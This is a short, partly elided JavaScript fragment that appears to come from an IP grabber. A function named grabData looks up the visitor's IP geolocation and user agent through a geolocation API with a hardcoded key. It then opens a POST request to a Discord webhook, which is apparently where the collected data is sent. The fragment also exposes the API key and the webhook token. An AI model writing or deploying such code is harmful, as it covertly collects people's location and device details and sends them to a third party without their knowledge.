const grabData = async () => {
    ...
    const request = async () => {
        ...
        const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=86c94b2ac4fb4539b0f25d953987ca9c");
        const user = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=86c94b2ac4fb4539b0f25d953987ca9c");
        ...
        postRequest.open("POST", 'https://discord.com/api/webhooks/1223236317358325851/X_StvlfOWWUm88wSECTFg76b5fwiqWTk_WVVat3wseprjohqmSVHZQwnAiJgajVm8UjI');
